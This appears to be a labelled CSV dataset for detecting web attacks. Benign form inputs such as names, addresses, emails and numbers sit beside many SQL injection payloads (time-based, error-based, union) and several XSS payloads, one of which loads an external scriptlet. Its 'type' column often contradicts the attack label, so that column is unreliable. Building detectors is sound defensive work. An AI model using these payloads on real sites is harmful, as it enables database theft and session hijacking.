Text,attack_type,Label,type
"-5243"" where 2105=2105 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1,sql
"1"" and 5205=9975#",sqli,1,normal
cot reixach,norm,0,normal
manganiello arias,norm,0,normal
"1%""));select (case when (3486=6373) then 3486 else 3486*(select 3486 from mysql.db) end)#",sqli,1,sql
franklyn,norm,0,normal
flixmara,norm,0,normal
chuanhsi,norm,0,normal
"calle puruuela, 15 6?d",norm,0,normal
"alcalde isidoro enciso, 100 6?g",norm,0,normal
">""<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",xss,2,sql
introduccin,norm,0,normal
1)) as cwyb where 3633=3633;select (case when (3681=5026) then 3681 else 3681*(select 3681 from information_schema.character_sets) end)#,sqli,1,sql
12835645n,norm,0,normal
7379824468809426,norm,0,normal
laguna de cameros,norm,0,normal
"-6971"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""ifuh"" like ""ifuh",sqli,1,sql
isolda,norm,0,normal
banaei,norm,0,normal
"<style>li {list-style-image: url(""javascript:alert('crosssitescripting')"");}</style><ul><li>crosssitescripting",xss,2,xss
"1) union all select null,null,null,null,null,null--",sqli,1,sql
florian@alcantarapartners.so,norm,0,normal
"paseo francisco mir berlanga 141, 12-e",norm,0,normal
ferreries,norm,0,normal
8105619729303205,norm,0,normal
m0t9n95ia,norm,0,normal
piperni,norm,0,normal
isidoro,norm,0,normal
7012769883161832,norm,0,normal
azmeena,norm,0,normal
2225,norm,0,normal
3ombero,norm,0,normal
sookdeo,norm,0,normal
r14orsi1a,norm,0,normal
"1')) as wves where 2641=2641 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"c/ ulises 17,",norm,0,normal
1')) or sleep(5)#,sqli,1,normal
8316,norm,0,normal
co8mov8mi886o,norm,0,normal
paulovic,norm,0,normal
watts@viajesnacionales.na,norm,0,normal
1) as xwgf where 4204=4204 and sleep(5)--,sqli,1,sql
ramsey,norm,0,normal
"carrer doctor esteve, 124,",norm,0,normal
1) as qgsb where 7600=7600 and 2006=2006,sqli,1,normal
harvison,norm,0,normal
hervs,norm,0,normal
-9225) or (8258=2726)*2726 and (9900=9900,sqli,1,normal
agres?iva,norm,0,normal
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('jmjw' like 'jmjw",sqli,1,sql
fabrizio,norm,0,normal
oestreic,norm,0,normal
"1"") where 3404=3404 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"marines, los",norm,0,normal
38507707a,norm,0,normal
16452,norm,0,normal
"-1<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",xss,2,xss
1686991353142188,norm,0,normal
alan4,norm,0,normal
"-9987))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((2114=2114",sqli,1,sql
64721683m,norm,0,normal
"1%""))) and 1594=8757",sqli,1,normal
cstaras,norm,0,normal
"-3819'))) union all select 9014,9014,9014,9014,9014,9014--",sqli,1,sql
re681g48rdia,norm,0,normal
"avenida constitucion espaola, 135,",norm,0,normal
"1%"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ""%""=""",sqli,1,sql
takahash,norm,0,normal
urgeles montanuy,norm,0,normal
arbcies,norm,0,normal
"-2784')) union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",sqli,1,sql
jobye,norm,0,normal
"1)) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((9325=9325",sqli,1,sql
san vicente de alcntara,norm,0,normal
81e9604o6o,norm,0,normal
"1"" and 3824=benchmark(5000000,md5(0x76555642))",sqli,1,normal
6922,norm,0,normal
"1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (3326=3326",sqli,1,sql
"<object type=""text/x-scriptlet"" data=""http://vulnerability-lab.com/scriptlet.html""></object>",xss,2,normal
"1"" and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""svse""=""svse",sqli,1,sql
scala@novisa.ch,norm,0,normal
"1""))) or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
fulivio,norm,0,normal
"1));select * from generate_series(2673,2673,case when (2673=1468) then 1 else 0 end) limit 1--",sqli,1,sql
r54o60a,norm,0,normal
villava/atarrabia,norm,0,normal
"1) as khkv where 2944=2944 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
"1) as zelk where 1944=1944 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
besnehard8@itrends.tn,norm,0,normal
janeva,norm,0,normal
2243766198035370,norm,0,normal
ficker,norm,0,normal
51780892a,norm,0,normal
besch@qcole.bt,norm,0,normal
6691710338743371,norm,0,normal
9516066261417526,norm,0,normal
basta@24htranslations.edu,norm,0,normal
"avinyo, 68 4?g",norm,0,normal
fernald,norm,0,normal
-3988')) union all select 1113#,sqli,1,sql
gianella,norm,0,normal
sariego,norm,0,normal
g8629e8d9r,norm,0,normal
1'+(select 'njee' where 4101=4101 and 3090=7873)+',sqli,1,sql
"1%"" and sleep(5) and ""%""=""",sqli,1,normal
guasch xifr,norm,0,normal
estic o'neil,norm,0,normal
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)-- wvjy",sqli,1,sql
"1"" where 9461=9461;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"-7296%'))) union all select 9322,9322,9322,9322--",sqli,1,sql
paolino amodeo,norm,0,normal
17488,norm,0,normal
sayle@miemail.com.ic,norm,0,normal
"1%""))) and (select * from (select(sleep(5)))fzno) and (((""%""=""",sqli,1,sql
08110,norm,0,normal
ichizen,norm,0,normal
absaln,norm,0,normal
ostrfera,norm,0,normal
26100,norm,0,normal
.32l6152v0o,norm,0,normal
whitwort,norm,0,normal
carretera 400 al km. 9 del km. 4 valldemossa 135,norm,0,normal
13189,norm,0,normal
"1,(select (case when (5885=1825) then 1 else 5885*(select 5885 from master..sysdatabases) end))",sqli,1,sql
"-7107""))) order by 1#",sqli,1,normal
marston.mannkopf@sigloventidos.al,norm,0,normal
09580,norm,0,normal
"-3270"" where 2144=2144 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",sqli,1,sql
ornstein@beljos.fr,norm,0,normal
"1""));select count(*) from generate_series(1,5000000)--",sqli,1,sql
jones_callas1@copiar.com.travel,norm,0,normal
4l6ad1e14,norm,0,normal
coomes@queinvento.cl,norm,0,normal
31253,norm,0,normal
"1%"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""=""",sqli,1,sql
48112,norm,0,normal
daroca,norm,0,normal
benaprs vaqu,norm,0,normal
23522946h,norm,0,normal
blaylock,norm,0,normal
"1'||(select 'ymac' from dual where 9268=9268 or 8466=benchmark(5000000,md5(0x694a4745)))||'",sqli,1,sql
6745,norm,0,normal
46593,norm,0,normal
rhonda,norm,0,normal
"1"" and elt(8464=5761,5761) and ""ydmt"" like ""ydmt",sqli,1,normal
"<<script>alert(""xss"");//<</script>",xss,2,xss
"-4639""))) or 8550=9348",sqli,1,normal
"1' in boolean mode) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))#",sqli,1,normal
"-6546"") order by 1#",sqli,1,normal
benning,norm,0,normal
"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""vfvh""=""vfvh",sqli,1,sql
"calle aljarafe, 161 13?b",norm,0,normal
18327,norm,0,normal
roedel,norm,0,normal
-8051) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (5637=5637,sqli,1,sql
"-9737""))) order by 1--",sqli,1,sql
standiford@elpaisaje.bg,norm,0,normal
"1)) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1%'))) and elt(7425=3843,3843) and ((('%'='",sqli,1,normal
alhendn,norm,0,normal
"1%"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ""%""=""",sqli,1,sql
79144797a,norm,0,normal
16362236j,norm,0,normal
hayman,norm,0,normal
espa7t4ro,norm,0,normal
abelli blasi,norm,0,normal
recincho,norm,0,normal
almarza de cameros,norm,0,normal
traspasar,norm,0,normal
"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('gucd'='gucd",sqli,1,sql
"-3228"") or (5901=1570)*1570 and (""egdd""=""egdd",sqli,1,normal
2366961377296297,norm,0,normal
valls barri,norm,0,normal
"1"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""umst""=""umst",sqli,1,sql
6368525574749403,norm,0,normal
"1%"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
i4sacular,norm,0,normal
leroy-beaulieu.rizzo7@softwaresaas.cl,norm,0,normal
1') where 1502=1502 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
1008,norm,0,normal
8166,norm,0,normal
"1"");waitfor delay '0:0:5' and (""dmcu""=""dmcu",sqli,1,sql
">""<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>",xss,2,xss
pereda barrio,norm,0,normal
clovis,norm,0,normal
2488378329284954,norm,0,normal
"1%"")));select (case when (2140=5325) then 2140 else 2140*(select 2140 from information_schema.character_sets) end)#",sqli,1,sql
75169095n,norm,0,normal
"1') where 6274=6274 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
3600495561903350,norm,0,normal
"1) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
"1%"") and 3824=benchmark(5000000,md5(0x76555642)) and (""%""=""",sqli,1,normal
"1"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""ycuo"" like ""ycuo",sqli,1,sql
felli,norm,0,normal
78154183e,norm,0,normal
"1 where 6365=6365;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"-5928"")) or elt(1032=1032,3623) and ((""rggt"" like ""rggt",sqli,1,normal
"1"") and elt(1889=7397,7397) and (""kuau""=""kuau",sqli,1,normal
kuenneke@portaldesign.dk,norm,0,normal
den21o9a,norm,0,normal
"1""))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((""ijag""=""ijag",sqli,1,normal
"1)) union all select null,null#",sqli,1,sql
ente4ado,norm,0,normal
"calle karmelo 68,",norm,0,normal
6052575458903968,norm,0,normal
murad@magadan.org.pe,norm,0,normal
gorr!n,norm,0,normal
95058822y,norm,0,normal
44381,norm,0,normal
"pl. ceramista gimeno, 43,",norm,0,normal
"-4256') where 9545=9545 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
"1"")));select * from generate_series(9058,9058,case when (9058=1183) then 1 else 0 end) limit 1--",sqli,1,sql
46837,norm,0,normal
cabarcos valero,norm,0,normal
comerma crdoba,norm,0,normal
claverol lemunao,norm,0,normal
"1""))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
"1') union all select null,null,null,null,null,null,null#",sqli,1,sql
roadman@wdsl.gu,norm,0,normal
wendt,norm,0,normal
tra5i0o0ed7a,norm,0,normal
1%'));select case when 7717=7717 then 1 else null end--,sqli,1,sql
carlosmara,norm,0,normal
"1' or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"calle antequeruela, 94, 7-a",norm,0,normal
dohanos_boulting@am-si.zw,norm,0,normal
05782219l,norm,0,normal
"1'||(select 'uebk' from dual where 6990=6990;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
35871689s,norm,0,normal
1);if(4735=8907) select 4735 else drop function qigo--,sqli,1,sql
82768054r,norm,0,normal
99431698f,norm,0,normal
chismear,norm,0,normal
thomson.kmit9@somagel.sk,norm,0,normal
9176775896982100,norm,0,normal
bonifacio,norm,0,normal
"1"" and 6969=(select 6969 from pg_sleep(5)) and ""twmy""=""twmy",sqli,1,sql
1') where 7478=7478;select pg_sleep(5)--,sqli,1,sql
46813,norm,0,normal
1)) rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
valderredible,norm,0,normal
"-1<img src=""jav ascript:document.cookie=true;"">",xss,2,sql
34475,norm,0,normal
tweddle,norm,0,normal
777t1c4rio,norm,0,normal
"c/ ramos carrion, s/n 2?h",norm,0,normal
1'||(select 'yhpe' where 8010=8010 rlike (select (case when (7910=3752) then 1 else 0x28 end)))||',sqli,1,sql
roi,norm,0,normal
"1"") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
"calle neptuno 162,",norm,0,normal
"1"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1,sql
imre,norm,0,normal
6025,norm,0,normal
"codigo postal para tele 5, 63 13g",norm,0,normal
ballb canudes,norm,0,normal
"1%""))) and elt(3114=3114,sleep(5))#",sqli,1,normal
"-4145%"")) union all select 9404,9404,9404,9404,9404,9404,9404#",sqli,1,sql
"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('aatp'='aatp",sqli,1,sql
caine@albeiteria.es,norm,0,normal
guino osarte,norm,0,normal
1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('gegg'='gegg,sqli,1,sql
"1,(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(8979,8979,case when (8979=8979) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",sqli,1,sql
hoyocasero,norm,0,normal
c9r1ne75,norm,0,normal
fuembellida,norm,0,normal
"-4210"") where 2679=2679 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1,sql
98850097f,norm,0,normal
<img id=xss src='javascript:alert('xss'),xss,2,xss
merida@elsentidodelavida.nc,norm,0,normal
"1) as itvm where 1482=1482;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
japan,norm,0,normal
1')));waitfor delay '0:0:5' and ((('ozjl' like 'ozjl,sqli,1,sql
apat17,norm,0,normal
"1)) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"-3362' where 6567=6567 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
3778695319344068,norm,0,normal
"1) as fgqe where 1526=1526 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
fl5ct499t1,norm,0,normal
08282,norm,0,normal
(8266=8266)*9900,sqli,1,normal
50227,norm,0,normal
laticfero,norm,0,normal
8323552403219603,norm,0,normal
"-1<table><td background=""javascript:document.cookie=true;"">",xss,2,xss
79039106c,norm,0,normal
7548,norm,0,normal
"1') as bagi where 1281=1281 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
mal,norm,0,normal
mo19bun0a,norm,0,normal
1'+(select pagd where 2484=2484;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
1')) union all select null--,sqli,1,sql
"1' where 7080=7080 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
1 and 6802=3592--,sqli,1,sql
adnado,norm,0,normal
5874582536939538,norm,0,normal
"-4707' union all select 4414,4414,4414,4414,4414,4414#",sqli,1,sql
45440,norm,0,normal
5034737965253978,norm,0,normal
"1') and make_set(4551=6487,6487) and ('jnqa'='jnqa",sqli,1,normal
2161,norm,0,normal
"1%"")) and elt(7633=4110,4110) and ((""%""=""",sqli,1,normal
8352337916705491,norm,0,normal
malethia,norm,0,normal
penarroya ingla,norm,0,normal
7159056780538837,norm,0,normal
1));select case when 8237=9948 then 1 else null end--,sqli,1,sql
1;begin user_lock.sleep(5); end-- podi,sqli,1,sql
hernani,norm,0,normal
9654,norm,0,normal
danilo,norm,0,normal
1796108365949620,norm,0,normal
4234394543607287,norm,0,normal
chilel,norm,0,normal
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('wuux'='wuux,sqli,1,sql
veri5icat1va,norm,0,normal
"-3979' in boolean mode) union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",sqli,1,sql
1%') and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('fvov'='fvov",sqli,1,sql
2l04a8,norm,0,normal
1'||(select 'lkmh' where 7659=7659;select pg_sleep(5))||',sqli,1,sql
m9ncilla57,norm,0,normal
pesquisar,norm,0,normal
0ntrecerrar,norm,0,normal
igualeja,norm,0,normal
doct4r9miento,norm,0,normal
nickolau,norm,0,normal
albareda castelltort,norm,0,normal
co5r5525e,norm,0,normal
gelber serarols,norm,0,normal
deba,norm,0,normal
"-8612'+(select 'iqla' where 5035=5035 union all select 5035,5035,5035,5035,5035,5035,5035#",sqli,1,sql
benifallet,norm,0,normal
plouffe4,norm,0,normal
moncada,norm,0,normal
"1"") and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""jhtc"" like ""jhtc",sqli,1,sql
"1'+(select 'ayod' where 7839=7839 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",sqli,1,sql
"calle barrio carmelo 21,",norm,0,normal
"1'+(select 'nhlx' where 2291=2291 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+'",sqli,1,sql
0755793804862737,norm,0,normal
krystall,norm,0,normal
engh-stritzel@normatic-vending.lv,norm,0,normal
18505219v,norm,0,normal
"1') as fxuk where 6184=6184 and make_set(9292=2785,2785)--",sqli,1,sql
"-7714 where 9768=9768 union all select 9768,9768--",sqli,1,sql
"1') where 3375=3375 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
kamekona@gopersonaltrainers.fj,norm,0,normal
8853092721111466,norm,0,normal
"1,(select * from generate_series(5609,5609,case when (5609=5609) then 1 else 0 end) limit 1)",sqli,1,sql
3244290959091087,norm,0,normal
"1%"" or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
slozil,norm,0,normal
"c/ pescaderia, 88 1?f",norm,0,normal
10745236g,norm,0,normal
goble,norm,0,normal
sant lloren des cardassar,norm,0,normal
marquet diez,norm,0,normal
8866944660576355,norm,0,normal
vila-seca,norm,0,normal
gaetano,norm,0,normal
"calle s'arraval, 114",norm,0,normal
exceptacin,norm,0,normal
1)) as svhd where 9761=9761;select case when 7717=7717 then 1 else null end--,sqli,1,sql
oli4c5r,norm,0,normal
5202,norm,0,normal
4a9a8g8,norm,0,normal
46510,norm,0,normal
estepa,norm,0,normal
-4208%'))) or 1133=9010--,sqli,1,sql
sazarina_logue@gay-tantra.lc,norm,0,normal
manzanares bruguer,norm,0,normal
"-2838"" where 5442=5442 union all select 5442#",sqli,1,sql
inmol4dor,norm,0,normal
51517640d,norm,0,normal
"1'+(select 'usoq' where 7783=7783 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))+'",sqli,1,sql
gines,norm,0,normal
brewton,norm,0,normal
montaa baltans,norm,0,normal
03199923w,norm,0,normal
29574909z,norm,0,normal
"calle practicante calixto rodriguez 163,",norm,0,normal
"1');select count(*) from generate_series(1,5000000) and ('qpdu'='qpdu",sqli,1,sql
vallanca,norm,0,normal
puigmitj del molino,norm,0,normal
13630,norm,0,normal
"campello, el",norm,0,normal
1)));(select * from (select(sleep(5)))srmq) and (((3124=3124,sqli,1,sql
1');select sleep(5)#,sqli,1,sql
"c/ ricardo codoer, 112,",norm,0,normal
1%' and 9198=9198--,sqli,1,sql
"-7065'+(select 'bdxr' where 1756=1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",sqli,1,sql
"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""kins""=""kins",sqli,1,sql
"1) as vqdh where 1603=1603;iif(4436=8910,1,1/0)",sqli,1,sql
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""",sqli,1,sql
demetrio,norm,0,normal
1')));select (case when (8234=2498) then 8234 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"-3349' or elt(6610=4379,4379) and 'poqm' like 'poqm",sqli,1,normal
totino,norm,0,normal
"corua, a",norm,0,normal
maldonado cubillos,norm,0,normal
puerto de santa cruz,norm,0,normal
88215924e,norm,0,normal
bidaurreta,norm,0,normal
"albadalejo hijuela 76,",norm,0,normal
violeta,norm,0,normal
yuh-tai,norm,0,normal
"document.getelementbyid(""div1"").innerhtml;</script>",xss,2,xss
22865538l,norm,0,normal
"-6746"") or (8459=8459)*4906 and (""kohi"" like ""kohi",sqli,1,normal
-8112'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('xopg'='xopg,sqli,1,sql
"1' in boolean mode) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"-1033 union all select 8731,8731,8731,8731,8731,8731--",sqli,1,sql
05357,norm,0,normal
clarucha,norm,0,normal
g46r2ch4,norm,0,normal
cazalilla,norm,0,normal
bufali,norm,0,normal
rigau amer,norm,0,normal
60219106t,norm,0,normal
guadiana 149 6f,norm,0,normal
"1') as kgnd where 1550=1550 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1%"")) and (select * from (select(sleep(5)))fzno) and ((""%""=""",sqli,1,sql
68364284g,norm,0,normal
anny,norm,0,normal
jessa,norm,0,normal
"calle colon de larreategui 48,",norm,0,normal
1') as uaoz where 2464=2464;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
6320,norm,0,normal
0644186942198058,norm,0,normal
quintanilla del coco,norm,0,normal
31243,norm,0,normal
9435,norm,0,normal
"1%');select count(*) from generate_series(1,5000000)--",sqli,1,sql
9448799154735544,norm,0,normal
20061667d,norm,0,normal
46978547n,norm,0,normal
venzal tamayo,norm,0,normal
63462420s,norm,0,normal
"1"" where 1140=1140 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",sqli,1,sql
caleb,norm,0,normal
-7273%')) order by 1#,sqli,1,normal
yung-pin,norm,0,normal
aldeanueva de barbarroya,norm,0,normal
cropper,norm,0,normal
borrenes,norm,0,normal
inobediecia,norm,0,normal
leonel,norm,0,normal
"1"") where 3250=3250 union all select null#",sqli,1,sql
norberto,norm,0,normal
![cdata[<!--]]<script>alert('xss');//--></script>,xss,2,xss
espejo jauregui,norm,0,normal
calle bertran de castellet 28 6e,norm,0,normal
1) where 1090=1090 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
"1"" union all select null,null,null,null,null,null,null,null#",sqli,1,sql
21564232f,norm,0,normal
paula pladellorens,norm,0,normal
tahull garola,norm,0,normal
"1%'))) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"-5691' union all select 6610,6610#",sqli,1,sql
1'));(select * from (select(sleep(5)))srmq) and (('nbzf' like 'nbzf,sqli,1,sql
syun,norm,0,normal
fomes,norm,0,normal
44314,norm,0,normal
"1) as nmlm where 9872=9872;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
43869,norm,0,normal
48415614q,norm,0,normal
"1%') union all select null,null,null--",sqli,1,sql
"-2359' union all select 2687,2687,2687#",sqli,1,sql
8790895171234504,norm,0,normal
berber,norm,0,normal
denver,norm,0,normal
18212,norm,0,normal
"1')));select benchmark(5000000,md5(0x4c4d6142)) and ((('egnv' like 'egnv",sqli,1,sql
"diogenes 82,",norm,0,normal
43421,norm,0,normal
"1' or 8466=benchmark(5000000,md5(0x694a4745))",sqli,1,normal
"1'))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
espinoza@canariasatuaire.lb,norm,0,normal
1)) or (select * from (select(sleep(5)))ydpu) and ((7805=7805,sqli,1,sql
osteicoechea uslet,norm,0,normal
wattier,norm,0,normal
fabra vicente,norm,0,normal
halum,norm,0,normal
1 union all select null#,sqli,1,sql
"1""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""sfbc""=""sfbc",sqli,1,sql
82474321r,norm,0,normal
randera,norm,0,normal
"carpio de tajo, el",norm,0,normal
"1') where 9006=9006 union all select null,null,null,null,null,null--",sqli,1,sql
tvara ganci,norm,0,normal
49339665l,norm,0,normal
